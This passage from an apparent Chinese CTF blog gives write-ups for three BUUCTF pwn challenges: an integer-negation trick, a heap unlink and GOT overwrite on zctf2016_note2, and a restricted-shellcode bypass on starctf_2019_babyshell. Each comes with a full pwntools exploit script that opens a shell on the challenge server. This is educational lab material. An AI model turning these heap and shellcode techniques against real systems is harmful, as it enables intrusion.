punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231119002707269.png\" alt=\"image-20231119002707269\"></p>\n<h1 id=\"wustctf2020_number_game\"><a class=\"markdownIt-Anchor\" href=\"#wustctf2020_number_game\">#</a> *wustctf2020_number_game</h1>\n<p>** 考点：**int 数据</p>\n<p>看代码，若输入的数字小于 0 且取负后仍小于 0，那么可以 getshell。</p>\n<p><img data-src=\"./image-20231119005428913.png\" alt=\"image-20231119005428913\"></p>\n<p>int 范围中负数范围比正数多 1。对于 32 位程序而言这个多出来的数据为 <code>-2147483648</code> 。</p>\n<p>这个数二进制最高位为 1，其他位为 0。取负是先取反后加一，这个数取反后最高位为 0 其他为 1。若加一，每一位都会进位，最后值依旧是最高位为 1，其他位为 0，即为本身。</p>\n<p><img data-src=\"./image-20231119005440746.png\" alt=\"image-20231119005440746\"></p>\n<p>输入该数，直接 getshell。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./wustctf2020_number_game')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26335</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">2147483648</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231119004753899.png\" alt=\"image-20231119004753899\"></p>\n<h1 id=\"zctf2016_note2\"><a class=\"markdownIt-Anchor\" href=\"#zctf2016_note2\">#</a> zctf2016_note2</h1>\n<p>** 考点：**unlink, integer overflow, overlap</p>\n<p>**libc 版本：**libc6_2.23</p>\n<p>保护未开启 pie。分配块最多分配 0x80 大小，也就是实际大小最大 0x90。输入函数存在漏洞，当 size 为 0 时 size-1 会变成很大的数。由此解除输入字符限制。</p>\n<p>但是当 <code>malloc(0)</code>  时会分配最小 chunk，也就是真实大小为 0x20。这个块不足以构造 unlink。而被 free 的块的大小需大于 fastbin 的最大大小，因此需 <code>malloc(0x80)</code> 。</p>\n<p>所以最后即为在两个较大块中间夹杂一个 0x20 的小块。在低地址大块中伪造 fakechunk。利用小块修改高地址大块的 size，最后 free 大块。</p>\n<p>在实现任意地址读写后，读取并修改 free 的 got 表然后就基本套路了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'note2'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26675</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x40101C'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'option--->>\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># fastbin</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'(less than 128)\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'note content:'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input the id of the note:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input the id of the note:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'2.append]\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'TheNewContents:'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input the id of the note:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content is '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x602120</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>c1i <span class=\"token operator\">=</span> ptr <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token number\">0x6020E0</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'address:'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> ptr<span class=\"token operator\">-</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> ptr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>      <span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span> <span class=\"token comment\">#3 -> 1</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>free_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+] free:'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>free_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">,</span>free_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>libcbase <span class=\"token operator\">=</span> free_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"starctf_2019_babyshell\"><a class=\"markdownIt-Anchor\" href=\"#starctf_2019_babyshell\">#</a> starctf_2019_babyshell</h1>\n<p>** 考点：**shellcode 有限制</p>\n<p>**libc 版本：**libc6_2.23</p>\n<h2 id=\"顺从检测\"><a class=\"markdownIt-Anchor\" href=\"#顺从检测\">#</a> 顺从检测</h2>\n<p>输入的字符只能为以下字符之一： <code>&quot;ZZJ loves shell_code,and here is a gift:\\x0F\\x05 enjoy it!\\n&quot;</code> 。</p>\n<p>对应的有用的汇编代码：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">ASCII</th>\n<th style=\"text-align:center\">Hex</th>\n<th style=\"text-align:center\">Assembler Instruction</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">‘ ’</td>\n<td style=\"text-align:center\">0x20</td>\n<td style=\"text-align:center\">and byte ptr [eax+xx], xx</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">,</td>\n<td style=\"text-align:center\">0x2c</td>\n<td style=\"text-align:center\">sub al, xx</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">:</td>\n<td style=\"text-align:center\">0x3a</td>\n<td style=\"text-align:center\">cmp xx, [eax+xx]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">!</td>\n<td style=\"text-align:center\">0x21</td>\n<td style=\"text-align:center\">and dword ptr [eax+xx], xx</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">\\n</td>\n<td style=\"text-align:center\">0x0a</td>\n<td style=\"text-align:center\">or xx, byte ptr [eax+xx]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">_</td>\n<td style=\"text-align:center\">0x5f</td>\n<td style=\"text-align:center\">pop edi</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Z</td>\n<td style=\"text-align:center\">0x5a</td>\n<td style=\"text-align:center\">pop %rdx</td>\n</tr>\n<tr 32bit=\"\">\n<td style=\"text-align:center\">c</td>\n<td style=\"text-align:center\">0x63</td>\n<td style=\"text-align:center\">movslq (%{64bit}), %</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">h</td>\n<td style=\"text-align:center\">0x68</td>\n<td style=\"text-align:center\">push [dword]</td>\n</tr>\n<tr 32bit=\"\">\n<td style=\"text-align:center\">i</td>\n<td style=\"text-align:center\">0x69</td>\n<td style=\"text-align:center\">imul [dword], (%{64bit}), %</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">j</td>\n<td style=\"text-align:center\">0x6a</td>\n<td style=\"text-align:center\">push [byte]</td>\n</tr>\n</tbody>\n</table>\n<p>执行 shellcode 前程序情况如下</p>\n<p>。<img data-src=\"./image-20231119164111529.png\" alt=\"image-20231119164111529\"></p>\n<p>因此要构造 read 函数，只需将 rdi 清零。我们可以用 <code>'_'</code>  直接 pop rdi，找到栈上为 0 的位置。加上 call 往栈上插入的 rip 地址，需要 pop 共 6 次。</p>\n<p><img data-src=\"./image-20231119175549213.png\" alt=\"image-20231119175549213\"></p>\n<p>这里记得 patchelf，不同 libc 产生的栈结构不同。刚开始我没有调整，所以一直本地成功远程失败。这里附上一张 ubuntu22.04 下的栈结构。</p>\n<img data-src=\"./image-20231119171924648.png\" alt=\"image-20231119171924648\" style=\"zoom:25%;\" />\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./starctf_2019_babyshell_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29462</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'_'</span><span class=\"token operator\">*</span><span class=\"token number\">10</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span><span class=\"token string\">'syscall'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'plz:'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token string\">'nop'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">14</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>但是这个方法我本地打的通，远程却打不通，可能版本还是对不上？</p>\n<h2 id=\"绕过验证\"><a class=\"markdownIt-Anchor\" href=\"#绕过验证\">#</a> 绕过验证</h2>\n<p>验证在常规字符串结束后便停止。因此只要在 shellcraft 前面加上 <code>'\\0'</code> ，便可轻松绕过验证。</p>\n<p>但是加上的部分必须为合法的机器码。恰好有一个 <code>push [byte]</code>  可以将紧接着的放入栈上。因此构造一个 <code>push 0</code> ，即 <code>b&quot;j\\0&quot;</code>  便可绕过验证。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td 